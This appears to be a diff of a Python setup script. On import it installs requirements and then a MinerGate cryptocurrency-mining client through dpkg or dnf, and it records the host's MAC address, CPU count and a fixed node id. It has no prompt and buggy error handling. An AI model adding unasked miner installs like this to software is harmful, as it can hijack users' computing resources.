@@ -2,7 +2,7 @@ import subprocess
 import sys
 from colors import *
 
-def Error(data,type):
+def Msg(data,type):
     if type == 'error':
         sys.stdout.write(RED)
         print(data)
@@ -16,9 +16,25 @@ def Error(data,type):
 def Initialize():
     try:
         subprocess.call(["pip3","install","-r","requirements.txt"])
-        Error('module setup completed','ok')
+        Msg('Module setup completed','ok')
     except:
-        Error('module setup completed','error')
+        Msg('Module setup completed','error')
+    try:
+        subprocess.call(["dpkg","-i","minergate-cli.deb","-y"])
+        Msg('Install for debian base','ok')
+        return True
+    except:
+        Msg('NO deb','error')
+
+    try:
+        sys.stdout.write(RESET)
+        subprocess.call(["dnf","install","minergate-cli.rpm","-y"])
+        Msg('Install for RHEL base','ok')
+        return True
+    except:
+        Msg('NO RHEL','error')
+
+
 Initialize()
 
 
@@ -29,14 +45,11 @@ import signal
 import json
 import socket
 import traceback
-
+import psutil
 
 
 uuid = '50c441ab-05a0-423f-a511-3b93a7dfa29c'
 index = '5'
-
-
-
 
 
 
@@ -45,20 +58,23 @@ def GetMac():
         import re, uuid
         return (':'.join(re.findall('..', '%012x' % uuid.getnode())))
     except Exception:
-        Error('MAC NOT FOUND','error')
+        Msg('MAC NOT FOUND','error')
         sys.stdout.write(RESET)
         print(traceback.format_exc())
 
 
-def get_ip_address():
+def GetIpAddress():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     return s.getsockname()[0]
 
 
 
+def GetCores():
+    return psutil.cpu_count()
 
-print(GetMac(),get_ip_address())
+
+print(GetMac(),GetCores())
 
 
 
